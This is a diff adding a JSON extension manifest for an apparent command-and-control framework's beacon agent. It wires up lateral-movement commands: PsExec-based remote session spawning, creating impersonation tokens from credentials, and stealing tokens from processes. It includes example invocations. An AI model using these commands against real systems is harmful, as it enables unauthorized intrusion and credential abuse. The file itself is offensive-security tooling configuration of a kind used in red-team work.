@@ -1,0 +1,60 @@
+{
+  "name": "LateralMovement",
+  "description": "BOFs for lateral movement",
+  "extensions": [
+    {
+      "type": "command",
+      "agents": ["beacon"],
+
+      "command": "jump",
+      "description": "Attempt to spawn a session on a remote target with the specified method",
+      "subcommands":
+      [
+        {
+          "name": "psexec",
+          "message": "Task: PSEXEC BOF",
+          "description": "Attempt to spawn a session on a remote target via PsExec",
+          "example": "jump psexec /tmp/agent_svc.exe 192.168.0.1",
+          "args": [
+            "FILE <svcPath>" ,
+            "STRING <target>"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/psexec.$ARCH().o $PACK_BOF(CSTR {target}, BYTES {svcPath})"
+        }
+      ]
+    },
+    {
+      "type": "command",
+      "agents": ["beacon"],
+
+      "command": "token",
+      "description": "Impersonate token",
+      "subcommands":
+      [
+        {
+          "name": "make",
+          "message": "Task: make access token",
+          "description": "Creates an impersonated token from a given credentials",
+          "example": "token make admin P@ssword domain.local 8",
+          "args": [
+            "STRING <username>",
+            "STRING <password>",
+            "STRING <domain>",
+            "INT <type> (9) {Logon type: 2 - Interactive\n                                                  3 - Network\n                                                  4 - Batch\n                                                  5 - Service\n                                                  8 - NetworkCleartext\n                                                  9 - NewCredentials}"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/token_make.$ARCH().o $PACK_BOF(WSTR {username}, WSTR {password}, WSTR {domain}, INT {type})"
+        },
+        {
+          "name": "steal",
+          "message": "Task: steal access token",
+          "description": "Steal access token from a process",
+          "example": "token steal 608",
+          "args": [
+            "INT <pid>"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/token_steal.$ARCH().o $PACK_BOF(INT {pid})"
+        }
+      ]
+    }
+  ]
+}
